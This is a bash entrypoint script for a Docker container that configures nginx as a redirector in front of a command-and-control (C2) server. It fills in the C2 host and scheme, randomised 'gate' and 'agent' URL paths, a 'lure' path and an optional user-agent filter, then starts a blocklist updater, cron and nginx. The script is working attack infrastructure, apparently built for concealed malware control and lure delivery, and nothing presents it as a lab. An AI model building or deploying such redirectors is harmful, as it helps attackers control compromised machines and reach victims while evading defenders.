#!/bin/bash
# docker/entrypoint.sh
# Substitutes environment variables into default.conf at container startup,
# then runs blocklist update, starts cron, and launches nginx.

set -e

CONF="/etc/nginx/sites-enabled/default"

required_vars=("DOMAIN_NAME" "C2_SERVER")
for var in "${required_vars[@]}"; do
  if [ -z "${!var}" ]; then
    echo "[entrypoint] ERROR: required environment variable '$var' is not set."
    exit 1
  fi
done

C2_SCHEME="${C2_SCHEME:-http}"
UA_PATTERN="${UA_PATTERN:-}"
PANEL_UPSTREAM="${PANEL_UPSTREAM:-panel:3000}"

# Dynamic include files written by the control plane (mounted volumes).
touch /etc/nginx/banlist.conf /etc/nginx/agent_routes.conf 2>/dev/null || true

echo "[entrypoint] Configuring nginx for $DOMAIN_NAME → $C2_SERVER"

GATE_BASE="${GATE_BASE_PATH:-/g$(head -c 200 /dev/urandom | tr -dc 'a-z0-9' | head -c 4)/}"
AGENT_BASE="${AGENT_BASE_PATH:-/a$(head -c 200 /dev/urandom | tr -dc 'a-z0-9' | head -c 4)/}"
LURE_BASE="${LURE_BASE_PATH:-/l/}"
echo "[entrypoint] Gate base $GATE_BASE, agent base $AGENT_BASE, lure base $LURE_BASE"

sed -i "s/<DOMAIN_NAME>/$(printf '%s' "$DOMAIN_NAME" | sed 's/[\/&]/\\&/g')/g" "$CONF"
sed -i "s/<C2_SERVER>/$(printf '%s'   "$C2_SERVER"   | sed 's/[\/&]/\\&/g')/g" "$CONF"
sed -i "s/<C2_SCHEME>/$C2_SCHEME/g" "$CONF"
sed -i "s|<GATE_BASE>|$(printf '%s' "$GATE_BASE" | sed 's/[\/&]/\\&/g')|g" "$CONF"
sed -i "s|<AGENT_BASE>|$(printf '%s' "$AGENT_BASE" | sed 's/[\/&]/\\&/g')|g" "$CONF"
sed -i "s|<LURE_BASE>|$(printf '%s' "$LURE_BASE" | sed 's/[\/&]/\\&/g')|g" "$CONF"
sed -i "s/<PANEL_UPSTREAM>/$(printf '%s' "$PANEL_UPSTREAM" | sed 's/[\/&]/\\&/g')/g" "$CONF"

if [ -n "$UA_PATTERN" ]; then
  sed -i "s|#UA_FILTER# ||g" "$CONF"
  sed -i "s|<UA_PATTERN>|$(printf '%s' "$UA_PATTERN" | sed 's/[\/&]/\\&/g')|g" "$CONF"
else
  sed -i "/#UA_FILTER#/d" "$CONF"
fi

echo "[entrypoint] Updating blocklist..."
blocklist-update.sh || echo "[entrypoint] WARNING: blocklist update failed - continuing."

echo "[entrypoint] Starting cron..."
service cron start

echo "[entrypoint] Starting nginx..."
exec nginx -g "daemon off;"
